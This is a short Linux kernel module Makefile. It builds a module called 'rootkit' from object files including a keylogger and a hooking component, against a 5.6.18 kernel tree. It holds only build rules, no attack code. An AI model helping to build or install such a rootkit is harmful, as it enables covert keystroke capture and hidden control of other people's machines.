ccflags-y := -std=gnu99
obj-m += rootkit.o
rootkit-objs := simple_rootkit.o fops.o keylogger.o etc.o hooking.o
S="../linux-5.6.18/"

all:
	make -C $S M=$(PWD) modules

clean:
	make -C $S M=$(PWD) clean
